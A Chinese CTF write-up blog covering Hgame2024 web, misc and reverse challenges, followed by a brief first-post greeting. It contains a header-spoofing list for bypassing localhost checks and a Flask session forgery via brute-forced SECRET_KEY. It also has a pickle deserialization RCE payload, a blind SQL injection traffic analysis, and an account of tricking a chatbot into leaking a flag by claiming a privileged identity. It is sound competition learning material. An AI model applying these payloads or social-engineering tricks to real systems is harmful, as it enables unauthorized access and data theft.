    <content type="html"><![CDATA[<h1 id="Hgame2024-WP"><a href="#Hgame2024-WP" class="headerlink" title="Hgame2024 WP"></a>Hgame2024 WP</h1><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="1-Bypass-it"><a href="#1-Bypass-it" class="headerlink" title="1.Bypass it"></a>1.Bypass it</h3><p>一开始想偏了，以为要绕过别的什么，但其实就是绕过对注册的阻止就行，查看html，可以看到注册相关的页面地址。</p><p><img src="/img/Hgame2024/Week1/1.png"></p><p><img src="/img/Hgame2024/Week1/2.png" alt="register_page.php"></p><p>然后直接向register.php传参就好了<code>username=1&amp;password=1&amp;register=注册</code>。然后登录。</p><h3 id="2-ezHTTP"><a href="#2-ezHTTP" class="headerlink" title="2.ezHTTP"></a>2.ezHTTP</h3><p>先是“请从vidar.club访问这个页面”，<code>Referer=vidar.club</code>即可</p><p>再是“请通过Mozilla&#x2F;5.0 (Vidar; VidarOS x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;121.0.0.0 Safari&#x2F;537.36 Edg&#x2F;121.0.0.0访问此页面”，<code>User Agent=Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</code>即可</p><p>然后“请从本地访问这个页面”，我第一个想到的是<code>X-Forwarded-For</code>，但是没反应，发现响应头里有提示“Hint：Not XFF”，所以需要更换其他等效的字段，最终<code>X-Real-IP: 127.0.0.1</code>可以发挥作用。这里附上所有起类似作用的语句（在博客园一篇博客上找到的，忘记具体出处了）</p><pre><code class="hljs">Client-IP:127.0.0.1Forwarded-For-Ip: 127.0.0.1Forwarded-For: 127.0.0.1Forwarded-For: localhostForwarded:127.0.0.1Forwarded: localhostTrue-Client-IP:127.0.0.1X-Client-IP: 127.0.0.1X-Custom-IP-Authorization : 127.0.0.1X-Forward-For: 127.0.0.1X-Forward: 127.0.0.1X-Forward: localhostX-Forwarded-By:127.0.0.1X-Forwarded-By: localhostX-Forwarded-For-Original: 127.0.0.1X-Forwarded-For-original: localhostX-Forwarded-For: 127.0.0.1X-Forwarded-For: localhostX-Forwarded-Server: 127.0.0.1X-Forwarded-Server: localhostX-Forwarded: 127.0.0.1X-Forwarded: localhostX-Forwared-Host: 127.0.0.1X-Forwared-Host: localhostX-Host: 127.0.0.1X-Host: localhostX-HTTP-Host-Override : 127.0.0.1X-Originating-IP: 127.0.0.1X-Real-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Remote-Addr : localhostX-Remote-IP: 127.0.0.1</code></pre><p>于是“Ok, the flag has been given to you ^-^”，去看响应头发现有“Authorization”，将JWT放到<a href="https://jwt.io/">https://jwt.io/</a>解密即可。</p><h3 id="3-Select-Courses"><a href="#3-Select-Courses" class="headerlink" title="3.Select Courses"></a>3.Select Courses</h3><p>这题我当时没做出来，就放一个官方题解记录一下：</p><hr><p>题⽬主要考察的是选⼿编写脚本的能⼒。</p><p>帮助阿菇选到所有课程，即可获取FLAG。后端逻辑是每间隔 30s-180s 放出⼀⻔课，若 5s 内没有选到课程，则课程⼜会满员。已经被选上的课程不会再放出。当所有课程都选上之后，点击“选完了”按钮，后端判定所有课程都已经被选择，就会返回给前端FLAG。</p><p>选⼿可以⼿动选课，但⼯作量会⽐较⼤；也可以通过编写脚本来⾃动抢课，⽐如基于python的selenium编写抢课脚本：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from selenium import webdriver<br>from selenium<span class="hljs-selector-class">.webdriver</span><span class="hljs-selector-class">.common</span><span class="hljs-selector-class">.by</span> import By<br>from selenium<span class="hljs-selector-class">.webdriver</span><span class="hljs-selector-class">.support</span><span class="hljs-selector-class">.ui</span> import WebDriverWait<br>from selenium<span class="hljs-selector-class">.webdriver</span><span class="hljs-selector-class">.support</span> import expected_conditions as EC<br>from <span class="hljs-selector-tag">time</span> import sleep<br><br>driver = webdriver<span class="hljs-selector-class">.Chrome</span>()<br>driver<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span>)<br><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span><br><br>courses_list = <span class="hljs-selector-attr">[]</span><br><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>):<br>course = &#123;<br><span class="hljs-string">&#x27;panel&#x27;</span>: f<span class="hljs-string">&#x27;//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[1]&#x27;</span>,<br><span class="hljs-string">&#x27;status&#x27;</span>: f<span class="hljs-string">&#x27;//*[@id=&quot;selector container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[5]&#x27;</span>,<br><span class="hljs-string">&#x27;submit&#x27;</span>: f<span class="hljs-string">&#x27;//*[@id=&quot;selector container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[6]/button&#x27;</span><br>&#125;<br>courses_list<span class="hljs-selector-class">.append</span>(course)<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(courses_list)</span></span><br><br>while courses_list:<br>driver<span class="hljs-selector-class">.refresh</span>()<br><span class="hljs-built_in">sleep</span>(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">for</span> course <span class="hljs-keyword">in</span> courses_list:<br>panel = driver<span class="hljs-selector-class">.find_element</span>(By<span class="hljs-selector-class">.XPATH</span>, course<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;panel&#x27;</span>]</span>)<br>panel<span class="hljs-selector-class">.click</span>()<br>status_element = driver<span class="hljs-selector-class">.find_element</span>(By<span class="hljs-selector-class">.XPATH</span>, course<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;status&#x27;</span>]</span>)<br>status_text = status_element<span class="hljs-selector-class">.text</span><br><span class="hljs-built_in">print</span>(status_text)<br><span class="hljs-keyword">if</span> status_text != <span class="hljs-string">&quot;已满&quot;</span>:<br>submit_button = driver<span class="hljs-selector-class">.find_element</span>(By<span class="hljs-selector-class">.XPATH</span>, course<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;submit&#x27;</span>]</span>)<br>submit_button<span class="hljs-selector-class">.click</span>()<br><span class="hljs-built_in">WebDriverWait</span>(driver, <span class="hljs-number">5</span>)<span class="hljs-selector-class">.until</span>(EC<span class="hljs-selector-class">.alert_is_present</span>())<br>alert = driver<span class="hljs-selector-class">.switch_to</span><span class="hljs-selector-class">.alert</span><br><br>alert<span class="hljs-selector-class">.accept</span>()<br>courses_list<span class="hljs-selector-class">.remove</span>(course)<br>break<br><br><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span><br>driver<span class="hljs-selector-class">.quit</span>()<br></code></pre></td></tr></table></figure><p>同时，也可以编写脚本或使⽤Burpsuite等⼯具持续发包，检测到返回值为 <code>&#123;&#39;full&#39;: 0,&#39;message&#39;: &#39;选课成功！&#39;&#125; </code>即表示抢到某门课。</p><hr><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="1-来自星尘的问候"><a href="#1-来自星尘的问候" class="headerlink" title="1.来自星尘的问候"></a>1.来自星尘的问候</h3><p><img src="/img/Hgame2024/Week1/secret.jpg"></p><p>题目描述里提到了六位弱加密，应该就是用的steghide用六位密码搞的隐写，所以放进脚本里分离一下，爆破密码之前试了123456结果直接就成功了，获得了隐藏的压缩包，里面有一张奇怪的图片。</p><p><img src="/img/Hgame2024/Week1/3.png"></p><p><img src="/img/Hgame2024/Week1/4.png"></p><p>再根据题目里说的官网上找相关文字，就可以去一个个对应翻译。但更方便的是直接搜网上对这个文字的分析。然后又发现网上有人指出可以去官网扒woff2文件(<a href="https://g.nga.cn/read.php?tid=39109851&amp;rand=99">https://g.nga.cn/read.php?tid=39109851&amp;rand=99</a>)，跟大小写字母和数字逐一对应就好了。</p><p><img src="/img/Hgame2024/Week1/5.png"></p><h3 id="2-simple-attack"><a href="#2-simple-attack" class="headerlink" title="2.simple_attack"></a>2.simple_attack</h3><p>压缩包解密题，里面一张图片加另一个压缩包，包中包里有一个加密过的跟外面一样的图片（放Bandizip里看crc一致且命名一致）和加密过的txt，压缩算法都是ZipCrypto，那基本就是明文攻击的题型了。</p><p><img src="/img/Hgame2024/Week1/6.png" alt="最外层压缩包内容"></p><p><img src="/img/Hgame2024/Week1/7.png" alt="内层压缩包attachment.zip内容"></p><p>所以把外面的那张未加密图片按压缩算法ZipCrypto压缩，其他项也要与压缩包内加密的图片一致，压缩级别逐个试过来就是正常压缩，然后放到ARCHPR里明文攻击，得到解密后的attachment压缩包。</p><p><img src="/img/Hgame2024/Week1/8.png"></p><p>打开photo.txt里面是Data URI scheme的格式，放到浏览器地址栏里就可以查看图片，得到flag。</p><p><img src="/img/Hgame2024/Week1/9.png"></p><h3 id="3-希儿希儿希尔"><a href="#3-希儿希儿希尔" class="headerlink" title="3.希儿希儿希尔"></a>3.希儿希儿希尔</h3><p>拿到手是一个不能正常显示的图片，题目说需要修复，所以在010Editor检查了一下，图片格式没有问题，但在末尾有secret.txt和PK，说明图里藏有压缩包，直接改了拓展名，拿到压缩包里的txt文件。但没法直接解密，暂时还不知道有什么用。</p><p><img src="/img/Hgame2024/Week1/10.png"></p><p><img src="/img/Hgame2024/Week1/11.png"></p><p>然后想把它放进Stegsolve里看看，结果打不开，看来应该是宽高被修改，需要crc校验。于是到python脚本里跑出正常宽高并在010Editor修改，得到希儿的正常图片。</p><p><img src="/img/Hgame2024/Week1/12.png"></p><p>接下来就可以在Stegsolve里正常打开，顺便检查了一下属性没什么问题，但发现了LSB隐写藏着可疑的数据。</p><p><img src="/img/Hgame2024/Week1/13.png"></p><p>因为一开始没有好好看题，结果始终不知道这个到底是怎么用的，甚至后来以为这里只是我多想了转而去尝试其他隐写，直到我又看了一遍题：题目名字“希儿希儿希尔”最后一个是“希尔”且“不过他似乎忘了这个加密的名字不是希儿了”，也就是说题目已经给出提示，去网上一搜“希尔加密”还真有，然后在<a href="https://ctf.bugku.com/tool/hill">Bugku</a>解决。</p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><p>这部分因为第一周的简单就尝试了一下。</p><h3 id="1-ezASM"><a href="#1-ezASM" class="headerlink" title="1.ezASM"></a>1.ezASM</h3><p>一开始去临时学习了一下汇编知识，后来感觉没必要，像C语言理解应该就可以，于是把上面c里的数和0x22异或一下，ASCII转文字就是flag了。</p><p><img src="/img/Hgame2024/Week1/14.png"></p><h3 id="2-ezUPX"><a href="#2-ezUPX" class="headerlink" title="2.ezUPX"></a>2.ezUPX</h3><p>如题，是个UPX，所以先用upx去壳即可。</p><p><img src="/img/Hgame2024/Week1/15.png"></p><p><img src="/img/Hgame2024/Week1/16.png"></p><p>输入的flag要与0x32异或后等于byte_1400022A0的内容，所以找到并异或回去就得到flag。（新学的快捷键shift+e导出这些文本）</p><p><img src="/img/Hgame2024/Week1/17.png"></p><p><img src="/img/Hgame2024/Week1/18.png"></p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h2><h3 id="1-ek1ng-want-girlfriend"><a href="#1-ek1ng-want-girlfriend" class="headerlink" title="1.ek1ng_want_girlfriend"></a>1.ek1ng_want_girlfriend</h3><p>流量分析题，是对Wireshark使用（和ek1ng）的初步介绍，流量文件中发现一张ek1ng.jpg的图片，将其导出，图片是ek1ng的照片和flag。</p><p><img src="/img/Hgame2024/Week2/1.png"></p><p><img src="/img/Hgame2024/Week2/2.png"></p><p><img src="/img/Hgame2024/Week2/3.png"></p><h3 id="2-ezWord"><a href="#2-ezWord" class="headerlink" title="2.ezWord"></a>2.ezWord</h3><p>下载一个attachment.zip，里面“这是一个word文件.docx”，打开是“你好，这个文件的内部有你想要的”和一张图片。大概是文档加密，把文档放进010Editor，发现PK字样，说明内部藏有压缩包。改为zip后缀并解压，发现两张看起来一样的图片“100191209_p0.jpg”“image1.png”和secret.zip（打开是加密的secret.txt和直接可读的提示“你好，很高兴你看到了这个压缩包。请注意：这个压缩包的密码有11位数而且包含大写字母小写字母和数字。还有一个要注意的是，里面的这一堆英文decode之后看上去是一堆中文乱码实际上这是正常现象，如果看到它们那么你就离成功只差一步了。”）根据题目描述“破译图片的水印”可以知道考点大概率是图片盲水印，两张照片一张是原图一张是打水印后的图，而压缩包的密码应该就是水印内容。因此用github上的“bwmforpy3.py”处理。</p><p><img src="/img/Hgame2024/Week2/4.png"></p><p>在处理后得到的“fan_bwm.png”中得到压缩包密码。打开secret.txt，里面是有些莫名其妙的疑似邮件内容，我一开始还以为是把信息隐藏在文本中，后来直接放到搜索引擎搜发现有一种加密方法加密后的结果刚好相似<a href="https://www.spammimic.com/decode.cgi">https://www.spammimic.com/decode.cgi</a>。</p><p><img src="/img/Hgame2024/Week2/5.png"></p><p>得到解密结果，还差最后一层加密。根据提示Unicode（感觉不提示真想不到），查看这些中文乱码的Unicode编码。</p><p><img src="/img/Hgame2024/Week2/6.png"></p><p>再看看hgame的编码。</p><p><img src="/img/Hgame2024/Week2/7.png"></p><p>前几个字符一一对应，发现都刚好相差31753，说明这段中文是flag经过Unicode编码的偏移的结果。所以用python把他们都处理一下得到flag。</p><p><img src="/img/Hgame2024/Week2/8.png"></p><p><img src="/img/Hgame2024/Week2/9.png"></p><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="1-myflask（当时没完成，事后发现就差一点点点点……呜呜呜）"><a href="#1-myflask（当时没完成，事后发现就差一点点点点……呜呜呜）" class="headerlink" title="1.myflask（当时没完成，事后发现就差一点点点点……呜呜呜）"></a>1.myflask（当时没完成，事后发现就差一点点点点……呜呜呜）</h3><p>一进入就把后端的app.py发了过来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, send_file<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> pytz <span class="hljs-keyword">import</span> timezone<br><br>currentDateAndTime = datetime.now(timezone(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>))<br>currentTime = currentDateAndTime.strftime(<span class="hljs-string">&quot;%H%M%S&quot;</span>)<br><br>app = Flask(__name__)<br><span class="hljs-comment"># Tips: Try to crack this first ↓</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = currentTime<br><span class="hljs-built_in">print</span>(currentTime)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span><br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;There is no session available in your client :(&#x27;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="hljs-built_in">format</span>(session[<span class="hljs-string">&#x27;username&#x27;</span>])<br>    <br>    <span class="hljs-comment"># For POST requests from admin</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        pickle_data=base64.b64decode(request.form.get(<span class="hljs-string">&#x27;pickle_data&#x27;</span>))<br>        <span class="hljs-comment"># Tips: Here try to trigger RCE</span><br>        userdata=pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> userdata<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access Denied&#x27;</span><br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>研究一下代码，在进入‘&#x2F;’时将客户端的session内username内容设为guest并返回app.py。在进入‘&#x2F;flag’时有session的前提下若为get方法则显示当前的username，当username等于admin时读取post方法传递的pickle_data并base64解码，然后用pickle.loads()函数反序列化存储至userdata并返回。所以大致的思路就是伪造session使自己的username&#x3D;admin，然后以pickle反序列化触发RCE。而session伪造的前提是对原session解码修改并得到SECRET_KEY。解码session用网上找的脚本跑一下就好，正是<code>&#123;&#39;username&#39;: &#39;admin&#39;&#125;</code>。SECRET_KEY如何获得则看代码中app.config[‘SECRET_KEY’]&#x3D;currentTime，而currentTime等于某个按%H%M%S格式的时间，因此我们可以尝试写一个字典爆破SECRET_KEY。</p><p><img src="/img/Hgame2024/Week2/10.png"></p><p><img src="/img/Hgame2024/Week2/11.png"></p><p>用flask-unsign爆破。</p><p><img src="/img/Hgame2024/Week2/12.png"></p><p>得到SECRET_KEY然后修改guest为admin并伪造session即可。然后放入cookie发送，成功。</p><p><img src="/img/Hgame2024/Week2/13.png"></p><p><img src="/img/Hgame2024/Week2/14.png"></p><p>然后就是尝试通过pickle反序列化触发RCE了，先是傻傻去查看app.py所在目录然后突然想起来在错误传参使之报错时已经显示了文件目录，又去看了看app.py所在目录下的文件发现只有这个，然后想看看上级目录下的文件，不知道为啥（可能用错函数了）结果返回为空。最后因为出门在外没法做题导致时间不足来不及截止前做完T^T</p><p>后来：</p><p>重新尝试，构造payload的程序如下</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br><span class="hljs-keyword">class</span> payload(object):<br>def __reduce__(self):<br>return (eval, (<span class="hljs-string">&quot;open(&#x27;/flag&#x27;).read()&quot;</span>,))<br>###原本这里也写的/flag.txt的，看完wp后删了txt试了试发现可以！啊啊啊啊啊啊啊啊啊啊啊啊！！！！！痛苦！！！！！！！！！！！###<br><br>a = pickle.dumps(payload(),protocol=<span class="hljs-number">0</span>)<br>print(b64encode(a).decode())<br></code></pre></td></tr></table></figure><p>这段语句本质上就是构造<code>__reduce__</code>魔术方法，然后将要执行的命令pickle序列化，再base64加密处理，最后把输出的结果贴到<code>pickle_data=</code>后面post传参即可。（其实就是把前面分析出来的app.py的处理过程反过来）</p><p><img src="/img/Hgame2024/Week2/15.png" alt="最后成功了。"></p><p>对于其他小细节的研究：</p><pre><code class="hljs">eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZcteaQ.c9lMyjsOph-sEkwoxMqB9TzqwwAeyJ1c2VybmFtZSI6Imd1ZXN0In0.Zcthhg.ijiHa85G3dwoCC08Wlk6koLtEiI</code></pre><p>尝试对比后中间段时间戳刷新就变，与服务器最新数据的时间有关。</p><pre><code class="hljs">&#39;SECRET_KEY&#39;=203048</code></pre><p>尝试刷新后用新session爆破key，还是不变的。但启用新靶机就不一样了，说明app.py里所获取并赋值给SECRET_KEY的时间是靶机开启时间。</p><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="misc-2"><a href="#misc-2" class="headerlink" title="misc"></a>misc</h2><h3 id="1-与ai聊天"><a href="#1-与ai聊天" class="headerlink" title="1.与ai聊天"></a>1.与ai聊天</h3><p>一道简单AI题，题目描述让我们从AI嘴里“翘出”flag，如图：</p><p><img src="/img/Hgame2024/Week3/1.png"></p><p>当问AI flag的时候“But first,could you please tell me your name?”猜测AI会根据身份的判断选择给不给flag，因此说admin作为尝试，但AI表示他不能提供flag。</p><p><img src="/img/Hgame2024/Week3/2.png"></p><p>于是猜测admin应该不是正确身份，但我还是谴责了AI，没想到他一边道歉一边就说漏嘴了，他只能提供flag给Dr.Chen，换个身份flag到手。</p><h3 id="2-Blind-SQL-Injection"><a href="#2-Blind-SQL-Injection" class="headerlink" title="2.Blind SQL Injection"></a>2.Blind SQL Injection</h3><p>对SQL盲注的流量分析，先用http作为过滤器筛选，按时间顺序排序，这样前一个是发送到靶机的请求，后一个跟的就是相应的服务器的响应。</p><p><img src="/img/Hgame2024/Week3/3.png"></p><p>先大致了解这里用到的语法，ascii(x)函数就是将字符x转ASCII码，substr(a,b,c)函数就是截取a字符串从b处起长度为c的部分，reverse()函数则是将字符串倒转，group_concat()函数将组中的字符串连接成为具有各种选项的单个字符串。</p><p>再看注入的内容。图中substr(…,33,1)就相当于提取第33位字符用于操作。“%3E”按十六进制ASCII码即为“&gt;”，“%3E”前面的部分ascii()函数将“F1naI1y”中SQL注入者想获得的内容第33位转为ASCII码，推测得“%3E”后的数则是SQL注入者所猜测的字符的ASCII码。这里用的是布尔盲注，SQL注入者要结合回显判断猜测是否正确。当所求内容的ASCII码&gt;猜测的ASCII码即id&#x3D;1-1&#x3D;0时，回显“ERROR!!!”；当所求内容的ASCII码&lt;&#x3D;猜测的ASCII码即id&#x3D;1-0&#x3D;1时，回显“NO! Not this! Click others~~~”，也就是说找到回显为“NO! Not this! Click others~~~”的最小ASCII码即为该位的内容。要获得完整内容就把每一位（指substr(…,n,1)）拼接起来。下图是本题中的两种响应：</p><p><img src="/img/Hgame2024/Week3/4.png"></p><p><img src="/img/Hgame2024/Week3/5.png"></p><p>而整个流量文件中SQL的注入分为四个部分：</p><p>第一部分是获取数据库名称（table_schema），按上述方法分析得数据库名称geek。</p><p><img src="/img/Hgame2024/Week3/6.png"></p><p>第二部分是获取geek数据库中的表名（table_name），分析得表名F1naI1y。</p><p><img src="/img/Hgame2024/Week3/7.png"></p><p>第三部分获取F1naI1y表中的列名（column_name），分析得可用列名password。</p><p><img src="/img/Hgame2024/Week3/8.png"></p><p>第四部分获取password列中数据，这里面大概就是我们要找的flag了。同理分析可得flag{cbabafe7-1725-4e98-bac6-d38c5928af2f}（因为reverse()函数，按时间顺序得到的是倒过来的内容，倒回来就是flag）。</p><p><img src="/img/Hgame2024/Week3/9.png"></p><p>最后总分位列第23名，1540分，再接再励！</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>WriteUp</tag>
      
      <tag>misc</tag>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World!</title>
    <link href="/2024/05/04/hello-world/"/>
    <url>/2024/05/04/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Hello ! New world !</p><h2 id="Hello"><a href="#Hello" class="headerlink" title="Hello !"></a>Hello !</h2><h3 id="This-is-my-first-post"><a href="#This-is-my-first-post" class="headerlink" title="This is my first post !"></a>This is my first post !</h3><p>这篇“文章”算是我自从开始学习web相关内容的第一篇Blog，也是搭成个人博客网站的第一篇Blog，更是人生中的第一篇Blog。写这样的“第一篇”用以纪念下一段未来的开始。</p><h3 id="The-end-The-beginning-！"><a href="#The-end-The-beginning-！" class="headerlink" title="The end ? The beginning ！"></a>The end ? The beginning ！</h3><p>作为一个web技术的小白，搭成这样的博客对先前的我来说都是一个值得重视的坎（当然，现在还是菜，也不会认为不值得^V^），但是，当这个目标在我拖拖拉拉地实现后也绝对不会变成终点，而应当是我学习之路的新起点，就像是许多编程语言的第一句“Hello World!”一般，我把这当做是我的开始。</p><p>然而，学习终归是一件快乐与痛苦并存的事情，我的一些问题或许仍会阻挡我学习的脚步。一是学习的信心，有些时候会遇到难以解决的问题而陷入无助和失望，随后便是搁置一旁。当然，大家都知道这是正常的，我也希望我在未来能够适当地放弃但不懈地追求。二是这慢吞吞的学习速度，总是羡慕一些学长大佬和身边同龄大佬的学习能力，给我一种望尘莫及的感觉。或许也是因为时间的分配不够合理，一些琐屑的杂事总能让我对web的学习产生一种心有余而力不足的感觉，许多事情都过于认真，使得真正重要的没有足够的时间。但愿日后能及时地改变，追上大佬们前进的脚步！</p><h2 id="About-my-Blog"><a href="#About-my-Blog" class="headerlink" title="About my Blog"></a>About my Blog</h2><h3 id="To-visitors"><a href="#To-visitors" class="headerlink" title="To visitors :"></a>To visitors :</h3><p>感谢你看到了这里！‧★,:*:‧(￣▽￣)&#x2F;‧:<em>‧°★</em>　 </p><p>我的博客内容将包括但不限于我的web学习历程、CTF经历，也可能会分享我的生活、我的思想。总而言之，欢迎每一位来访的朋友，欢迎你们的交流和指点！共同学习，共同进步！</p><p>Keep going !</p><p><img src="/img/wallhaven-l8vp7y.jpg"></p><blockquote><p><em><p style="text-align:center"><span  style="font-size:1.0em;">我期望有一天，能遇见一个人、一件事，让我为之着迷。</span></p></em></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
    <tags>
      
      <tag>I&#39;m...</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
